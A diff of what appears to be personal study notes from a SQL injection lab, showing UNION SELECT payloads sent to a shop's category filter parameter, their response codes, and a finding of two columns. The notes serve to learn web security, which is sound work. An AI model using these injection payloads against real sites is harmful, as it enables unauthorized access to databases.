@@ -58,8 +58,10 @@ GET /filter?category=Corporate+gifts' UNION SELECT NULL -- HTTP/1.1   400 bad re
 GET /filter?category=Corporate+gifts HTTP/1.1                         200 Good Request
 GET /filter?category=Corporate+gifts UNION SELECT NULL; HTTP/1.1         400
 GET /filter?category=Corporate+gifts' UNION SELECT NULL;-- HTTP/1.1    400
-Get our column count and type:
+Get our count:
 GET /filter?category=Corporate+gifts'+UNION+SELECT+'NULL','NULL'+FROM+dual-- HTTP/1.1   200 OK we have two columns of data. 
+We may want to know Types of data sent:
+
 
 4. Blind SQL injection vulnerabilities
 https://portswigger.net/web-security/sql-injection/blind
